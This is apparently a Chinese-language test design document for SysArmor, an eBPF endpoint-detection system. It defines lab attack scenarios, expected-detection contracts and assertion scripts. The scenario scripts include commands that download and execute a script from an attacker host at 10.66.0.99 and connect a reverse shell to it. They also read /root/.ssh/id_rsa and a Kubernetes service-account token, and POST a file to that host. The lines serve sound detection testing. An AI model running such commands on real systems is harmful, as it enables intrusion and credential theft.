# SysArmor 测试用例设计

> 配套 design-mvp.md。本文定义**可执行、可断言、可追溯**的测试用例。
> 一句话原则：**每个测试都是一份契约——给定环境与攻击输入，系统必须产出/不产出指定的事实。**

---

## 一、两阶段测试策略

当前 SysArmor 处于 **Phase 0**(传感器采集验证),agent 和 manager 尚未构建。测试分两个阶段:

| 阶段 | 能测什么 | 断言手段 | 状态 |
|---|---|---|---|
| **Phase 0** (当前) | tetragon 采集的原始 Event 是否跨拓扑一致 | 直接过滤 jsonl | 可执行 |
| **Phase 1** (待 agent/manager 构建) | 端侧 Signal / 云端 Incident / 收敛 / 响应 | sysarmorctl --json | 设计契约 |

Phase 0 证明"传感器原料正确";Phase 1 证明"整个管线成立"。Phase 0 是 Phase 1 的前置:如果 tetragon 事件流就不对,上层无从验证。

### Phase 0 测试目标

| 维度 | 命题 | 用例 |
|---|---|---|
| 跨拓扑一致 | 同一套 TracingPolicy 在容器/VM 下产出结构一致的 Event | apt-fileless-c2 / apt-staged-drop / benign-ci-noise |
| 关键事件可达 | C2 外联 + 凭据读取可被正确捕获 | apt-fileless-c2 |
| 跨 lineage 可分离 | 两阶段攻击产生不同 lineage 根,事件可按 lineage 分离 | apt-staged-drop |
| 不误报 | 良性 CI 噪音下不会产生误判(Phase 1 的 D6 验证,Phase 0 只验证事件模式) | benign-ci-noise |

### Phase 1 测试目标 (设计契约,待实现)

| 维度 | 命题 | 用例 |
|---|---|---|
| 生命周期 | 装得上、跑得稳、卸得净、不失控 | lifecycle-smoke |
| "响"的攻击 | 端侧能高置信产 terminal,云端缝合成案 | apt-fileless-c2 |
| 云端图立论 | 跨 lineage 共享实体,只有云端图能成案 | apt-staged-drop |
| 不误报 | 良性忙碌不产生 Incident(罕见度而非裸加) | benign-ci-noise |
| 性能基线 | GetEvents 吞吐 / CPU / RSS / 丢失率有基线 | perf-getevents (待实现) |

---

## 二、测试环境

### 2.1 两套独立拓扑

验证同一套 TracingPolicy + 事件模型在不同 endpoint 类型下产出一致。

| | 容器拓扑 (拓扑 A) | VM 拓扑 (拓扑 B) |
|---|---|---|
| 编排 | docker compose | Vagrant + libvirt |
| 节点 | attacker / node-a / mgr 容器 | attacker / node-a / mgr VM |
| tetragon | 容器,共享宿主内核 (`--pid=host`) | VM 内直装,独享 VM 内核 |
| 攻击触发 | `docker exec node-a` | `vagrant ssh node-a -c` (attack.sh 在 VM 内直接执行) |
| 需要 Docker | 是 | 否 |
| 需要 VM | 否 | 是 |

```
拓扑 A: 容器拓扑                           拓扑 B: VM 拓扑
┌─────────────────────────────────┐        ┌──────────┐  ┌──────────┐  ┌──────────┐
│  宿主机 Linux 内核               │        │ attacker │  │  node-a  │  │   mgr    │
│  └── Docker: sysarmor-net       │        │  VM(C2)  │  │ +tetragon│  │   VM     │
│       ├── attacker  10.66.0.99  │        │  独立内核 │  │  独立内核 │  │  独立内核 │
│       ├── node-a    10.66.0.11  │        └──────────┘  └──────────┘  └──────────┘
│       ├── mgr       10.66.0.10  │
│       └── tetragon  (eBPF 传感器)│        tetragon 在 VM 内核上直装
└─────────────────────────────────┘        不需要 Docker
```

两拓扑共享:同一份 TracingPolicy (`env/resources/syscall-capture.yaml`)、同一套 IP (10.66.0.0/24)、同一套 expected.yaml 契约。
区别仅在于 tetragon 运行位置(宿主内核 vs VM 内核)和攻击触发方式。

### 2.2 节点角色

| 角色 | IP | 说明 |
|---|---|---|
| attacker | 10.66.0.99 | C2 监听 :443 + 恶意脚本 http :8080 (测试网内,不出公网) |
| node-a | 10.66.0.11 | 被监控端点:跑 tetragon + 假凭据 (Phase 1 加 agent) |
| mgr | 10.66.0.10 | 当前占位;Phase 1 部署 manager + sysarmorctl |

### 2.3 Provisioning

**容器拓扑**: `make up`
- docker compose up 4 容器 + sysarmor-net bridge
- tetragon `--pid=host --privileged --cgroup host` 监控宿主内核上容器进程
- TracingPolicy 自动加载 (harness/start-container.sh)

**VM 拓扑**: `make up TOPO=vm`
- vagrant up 3 VM (generic/ubuntu2204, 内核 5.15+)
- tetragon 从 GitHub release 下载 tarball (含二进制+BPF lib),provision 自动安装
- systemd 管理 tetragon,TracingPolicy 在 provision 时自动加载

### 2.4 TracingPolicy 详情

两拓扑共用 `env/resources/syscall-capture.yaml`,采集两类内核事件:

| kprobe | 采集什么 | selector |
|---|---|---|
| `security_socket_connect` | 网络外联 | AF_INET / AF_INET6 |
| `security_file_permission` | 敏感文件读 | 前缀: `/root/.ssh`, `/var/run/secrets`, `/etc/passwd` |

加上 tetragon 自带的 `process_exec` / `process_exit` (进程谱系),构成 Event 三轴:
**process lineage** / **network socket** / **credential file**。

注意:当前 TracingPolicy **不采集** WRITE / CHMOD 事件。§4 中的预期 Event 列表反映的是 TracingPolicy 实际覆盖的范围,不是 design-mvp 中完整 CanonicalEvent 的全部种类。

### 2.5 测试网络与安全隔离

```
private_network 10.66.0.0/24
  node-a    10.66.0.11   业务 + tetragon
  mgr       10.66.0.10   manager 预留
  attacker  10.66.0.99   C2 :443 / 恶意脚本 :8080
```

铁律: C2 地址一律 10.66.0.99;攻击脚本只做行为逼真,不含真实破坏性 payload;环境禁止出公网。

---

## 三、攻击场景定义

每个场景给出:背景 → 攻击指令(容器版 + VM 版) → Phase 0 实际采集的 Event → Phase 1 预期 Signal/Incident 契约。

### 3.1 apt-fileless-c2 ("响"的攻击)

**背景**: Log4Shell 风格 RCE → 下载器 → 反弹 C2 + 后渗透。ATT&CK: T1190 → T1059 → T1105 → T1571。

**容器版** (`scenarios/container/apt-fileless-c2/attack.sh`):

```bash
docker exec node-a bash -c '
  curl -s http://10.66.0.99:8080/x.sh -o /dev/shm/x.sh
  chmod +x /dev/shm/x.sh
  bash /dev/shm/x.sh
'
```

**VM 版** (`scenarios/vm/apt-fileless-c2/attack.sh`):

```bash
# 在 node-a VM 内执行 (capture-vm.sh 通过 vagrant ssh 调用)
curl -s http://$C2:8080/x.sh -o /dev/shm/x.sh
chmod +x /dev/shm/x.sh
bash /dev/shm/x.sh
```

#### Phase 0: 实际采集的 Event

```
process_exec:  entrypoint → bash → curl → bash(x.sh) → bash -i → cat
process_kprobe:
  security_socket_connect  curl → 10.66.0.99:8080  (下载)
  security_socket_connect  bash → 10.66.0.99:443   (C2 回连)
  security_file_permission cat  → /root/.ssh/id_rsa  (凭据窃取)
```

全部在同一 lineage 内 (web 运行时谱系),exec_id → parent_exec_id 构成完整攻击链。

#### Phase 1: 预期 Signal / Incident 契约

```yaml
# scenarios/{container,vm}/apt-fileless-c2/expected.yaml
events:
  must_contain:
    - { kind: EXEC, binary: "*/bash", lineage_inherited: true }
    - { kind: CONNECT, dst: "10.66.0.99:443" }
    - { kind: OPEN, path: "/root/.ssh/id_rsa" }
endpoint_signals:
  must_have_entities: true
  must_contain:
    - { name: web_runtime_spawns_shell }
    - { name: download_by_lolbin, entities_keys: ["socket:10.66.0.99:8080"] }
    - { name: payload_dropped, entities_keys: ["file:/dev/shm/x.sh"] }
    - { name: reverse_shell_pattern, terminal: true,
        entities_keys: ["socket:10.66.0.99:443"], has_evidence_bundle: true }
  may_contain:
    - { name: sensitive_cred_read }
cloud_signals:
  must_contain: [dropped_payload_executed_and_connects, web_shell_chain]
incident:
  count: 1
  terminals_include_binary: ["bash"]
  evidence_subgraph_path: ["java-web", "bash", "/dev/shm/x.sh", "10.66.0.99:443"]
  converge_method: "rarity+causal-topk"
negative:
  endpoint_terminal_required: true
```

---

### 3.2 apt-staged-drop (跨 lineage,验证云端图立论)

**背景**: 落盘与执行分属不同 lineage,间隔一段时间。端侧任一 lineage 都看不到完整链,**只有云端按共享文件实体缝合**才能成案。ATT&CK: T1105 落盘 + T1574 后续加载执行。

**容器版** (`scenarios/container/apt-staged-drop/attack.sh`):

```bash
# 阶段1: lineage A (投放器落盘)
docker exec node-a bash -c '
  curl -s http://10.66.0.99:8080/helper -o /var/lib/app/plugins/helper
  chmod +x /var/lib/app/plugins/helper
'
sleep 8  # GAP 错峰
# 阶段2: lineage B (另一谱系加载执行)
docker exec node-a bash -c '
  /var/lib/app/plugins/helper --report http://10.66.0.99:443
'
```

**VM 版** (`scenarios/vm/apt-staged-drop/attack.sh`):

```bash
# 在 node-a VM 内执行,两阶段间 sleep GAP
curl -s http://$C2:8080/helper -o /var/lib/app/plugins/helper
chmod +x /var/lib/app/plugins/helper
sleep $GAP
/var/lib/app/plugins/helper --report http://$C2:443
```

#### Phase 0: 实际采集的 Event

```
阶段1 (lineage A):
  process_exec:  bash → curl
  process_kprobe: security_socket_connect  curl → 10.66.0.99:8080

阶段2 (lineage B):
  process_exec:  bash → helper → bash
  process_kprobe: security_socket_connect  bash → 10.66.0.99:443
```

两阶段的 process_exec 有不同的 `parent_exec_id` 根 (不同 lineage)。
当前 TracingPolicy 不捕获文件写入,所以"helper 落盘"事件在 Phase 0 不可见——这正是 Phase 1 需要补充的采集能力 (CollectionPolicy 扩展 WRITE/CHMOD kind)。

#### Phase 1: 预期 Signal / Incident 契约

```yaml
# scenarios/{container,vm}/apt-staged-drop/expected.yaml
endpoint_signals:
  must_have_entities: true
  must_contain:
    - { name: payload_dropped, terminal: false,
        entities_keys: ["file:/var/lib/app/plugins/helper"] }
    - { name: suspicious_exec_connect, terminal: false,
        entities_keys: ["file:/var/lib/app/plugins/helper", "socket:10.66.0.99:443"] }
cloud_signals:
  must_contain:
    - { name: dropped_payload_executed_and_connects, cross_lineage: true }
incident:
  count: 1
  lineage_ids_min: 2
  evidence_subgraph_contains_node: "/var/lib/app/plugins/helper"
  converge_method: "rarity+causal-topk"
negative:
  endpoint_terminal_required: false
  endpoint_terminal_count: 0
control_assertions:
  - disable: cloud.cross_lineage
    then_incident_count: 0
```

关键对照: 关闭 `cross_lineage` 缝合 → Incident=0,直接证明"云端图的必要性"。

---

### 3.3 benign-ci-noise (误报基准,罕见度而非裸加)

**背景**: 完全合法的 CI 构建,行为与攻击高度相似 (spawn shell + 下载 + 落可执行 + chmod + 执行 + 读凭据 + 外联)。裸加必误报,罕见度+结构不会。

**容器版** (`scenarios/container/benign-ci-noise/attack.sh`):

```bash
for i in $(seq 1 $CYCLES); do
  docker exec -e C2="$C2" node-a bash /usr/local/bin/build.sh
done
```

**VM 版** (`scenarios/vm/benign-ci-noise/attack.sh`):

```bash
for i in $(seq 1 "$CYCLES"); do
  curl -s http://$C2:8080/deps.tar -o /tmp/deps.tar || true
  mkdir -p /tmp/build && tar xf /tmp/deps.tar -C /tmp/build 2>/dev/null || true
  cp /tmp/build/tool /tmp/tool && chmod +x /tmp/tool 2>/dev/null || true
  /tmp/tool --build 2>/dev/null || true
  cat /var/run/secrets/kubernetes.io/serviceaccount/token >/dev/null 2>&1 || true
  curl -s -X POST --data-binary @/tmp/tool http://$C2:8080/upload -o /dev/null || true
done
```

#### Phase 0: 实际采集的 Event

```
每轮 CI:
  process_exec:  bash → curl → tar → cp → chmod → tool → cat
  process_kprobe: security_socket_connect  curl → 10.66.0.99:8080  ×N
                 (无敏感文件读命中 — TracingPolicy 的 /etc/passwd 前缀匹配
                  的是 runc/bash 的日常读取,不是 CI 的凭据读取)
```

CI 的 connect 模式与攻击完全相同 (curl → 10.66.0.99:8080),但 Incident 必须为 0。
Phase 0 只能验证"事件流里确实存在与攻击同形的 connect",无法验证收敛不误报 (那需要 agent)。
Phase 1 才能验证"罕见度让 CI 的 anomaly_score≈0,结构收敛不触发"。

#### Phase 1: 预期 Signal / Incident 契约

```yaml
# scenarios/{container,vm}/benign-ci-noise/expected.yaml
endpoint_signals:
  may_contain: [download_by_lolbin, payload_dropped, sensitive_cred_read]
incident:
  count: 0
control_assertions:
  - switch: "converge.mode=additive_threshold"
    then_incident_count_min: 1
negative:
  endpoint_terminal_count: 0
```

对照: 切换为 `additive_threshold` → 误报≥1,固化"裸加是反模式"。

---

## 四、Phase 1 用例设计 (待实现)

以下用例依赖 agent/manager 构建,当前为设计契约。

### 4.1 lifecycle-smoke (前置冒烟)

验证 agent 安装 → 策略下发 → 采集可见 → 资源不失控 → 优雅卸载,全流程无崩溃。

```yaml
# scenarios/{container,vm}/lifecycle-smoke/expected.yaml
lifecycle:
  agent_registered: true
  policy_applied: true
  events_visible:
    kind: EXEC
    require_lineage_id: true
    require_stable_id: true
  resource:
    rss_within_policy: true
    no_oom: true
    no_panic: true
  uninstall:
    exit_code: 0
    no_bpf_residue: true
```

5 个子用例: TC-LC-01 (注册) → TC-LC-02 (策略) → TC-LC-03 (采集) → TC-LC-04 (资源) → TC-LC-05 (卸载)。全绿后才跑攻击场景。

### 4.2 perf-getevents (性能基线)

阶梯式提升事件率 (1k/5k/10k/20k/50k eps),记录每档的 CPU/RSS/丢失率,产出基线曲线。
不是通过/失败门,而是为"是否需要自研 Native Sensor"提供决策依据。
待实现: load.sh 脚本 + 采集指标框架。

---

## 五、断言机制

### Phase 0: 直接过滤 jsonl

当前 harness/assert.py 为 dry-run,直接过滤 `.results/*.tetragon.jsonl`:

```bash
# 检查 apt-fileless-c2 是否包含 C2 connect
cat .results/apt-fileless-c2.vm.tetragon.jsonl | \
  python3 -c "import sys,json; [print('FOUND') for l in sys.stdin
    if 'sockaddr_arg' in l and '10.66.0.99' in l and '443' in l]"
```

### Phase 1: 通过 sysarmorctl

```bash
sysarmorctl incidents --scenario apt-fileless-c2 --json | \
  jq -e '.incidents | length == 1'
sysarmorctl incident <id> --evidence --json | \
  jq -e '.edges[] | select(.kind=="connect" and .dst=="10.66.0.99:443")'
```

### 断言分类

| 类型 | 含义 | Phase | 示例 |
|---|---|---|---|
| 正向存在 | 必须产出 | 0+ | Event 含 connect→C2; Incident=1 |
| 结构 | 证据子图形状 | 1 | 路径含 bash→connect→C2 |
| 契约完整性 | schema 不变量 | 1 | 每个 Signal 必带 entities (D4) |
| 负向缺失 | 必须不产出 | 0+ | benign 无敏感文件读; Incident=0 |
| 对照 (control) | 改开关验证设计立论 | 1 | 关 cross_lineage → 0; 切裸加 → 误报 |

---

## 六、测试工具与目录

```
test/
├── Makefile                 e2e 入口
├── env/                     搭建:拓扑定义 + 镜像 + 资源
│   ├── container/
│   │   ├── compose.yaml      容器拓扑声明
│   │   └── images/           Dockerfile (attacker / node-a / mgr)
│   ├── vm/
│   │   ├── Vagrantfile       VM 拓扑声明
│   │   └── provision/        install-tetragon / setup-c2 / setup-credentials
│   └── resources/            共享资源
│       ├── syscall-capture.yaml  TracingPolicy (去重,两拓扑共用)
│       └── registry-token        假凭据
├── scenarios/               执行:攻击脚本 + 期望契约
│   ├── container/            容器拓扑场景 (docker exec 触发)
│   ├── vm/                   VM 拓扑场景 (vagrant ssh 调用,VM 内执行)
│   │   ├── apt-fileless-c2/  attack.sh + expected.yaml
│   │   ├── apt-staged-drop/  attack.sh + expected.yaml
│   │   ├── benign-ci-noise/  attack.sh + expected.yaml
│   │   └── lifecycle-smoke/  expected.yaml (无 attack.sh,待 agent)
│   └── policies/             PolicyEnvelope 契约 (agent 配置,待接入)
├── harness/                  编排:start / stop / capture / assert / report
└── .results/                 抓包样本 (.container.tetragon.jsonl / .vm.tetragon.jsonl)
```

流程: `make up` → `make capture` → `make down`

采集步骤:
1. harness/capture-*.sh 启动 tetra getevents 后台采集
2. 执行 scenarios/<topo>/<name>/attack.sh
3. 等待事件窗口
4. 落盘 .results/<name>.<topo>.tetragon.jsonl
5. harness/assert.py 读 expected.yaml 断言 (当前 dry-run,仅 events 层)
6. Phase 1: Signal/Incident 层断言待 sysarmorctl 接入

---

## 七、测试矩阵与可追溯性

| 用例 | Phase | 验证命题 | 覆盖 schema | 里程碑 | 关键断言 |
|---|---|---|---|---|---|
| apt-fileless-c2 | **0** | 跨拓扑 Event 一致 + C2 connect/凭据读可达 | CanonicalEvent (connect/file_read) | - | 两拓扑均含 curl→:8080, bash→:443, cat→id_rsa |
| apt-staged-drop | **0** | 两阶段不同 lineage,Event 可按 lineage 分离 | CanonicalEvent.lineage_id | - | 两阶段不同 parent_exec_id 根 |
| benign-ci-noise | **0** | CI 事件流与攻击同形但无敏感文件读 | CanonicalEvent | - | curl→:8080 存在但无 id_rsa/serviceaccount |
| lifecycle-smoke | 1 | 装/跑/卸/不失控 | PolicyEnvelope, AgentHealth | M0/M3 | 无崩溃/无残留 |
| apt-fileless-c2 | 1 | 端侧 terminal + 云端缝合 | Signal(terminal+evidence), Incident | M1/M2 | Incident=1, 含 reverse_shell terminal |
| apt-staged-drop | 1 | 云端图立论:跨 lineage 缝合 | Signal.entities(FILE), cross_lineage Rule | M2 | Incident=1 跨 lineage; 关缝合→0 |
| benign-ci-noise | 1 | 罕见度≠裸加,不误报 | NodeRisk.rarity, ConvergeParams | M2/M3 | Incident=0; 切裸加→误报 |
| perf-getevents | 1 | 性能基线 | SensorHealth.dropped_events, ResourcePolicy | M3 | 丢失率/RSS≤阈值 |

可追溯性: 每条 design-mvp 验收标准至少被一个用例覆盖;每个关键 schema 字段 (stable_id / lineage_id / entities / terminal / rarity / cross_lineage) 至少被一个断言触达。

---

## 八、一句话总结

Phase 0 (当前): 三个攻击场景验证 tetragon 传感器采集跨拓扑一致——apt-fileless-c2 (同 lineage 全链可达)、apt-staged-drop (跨 lineage 可分离)、benign-ci-noise (CI 噪音与攻击同形但无敏感读)。Phase 1 (待 agent/manager): 同三个场景加上 Signal/Incident 断言——端侧 terminal、云端图缝合、罕见度+结构收敛不误报,再加 lifecycle-smoke (agent 生命周期) 和 perf-getevents (性能基线)。负向与对照断言守住"端侧不越界、云端图有价值、收敛不裸加"三条立论。
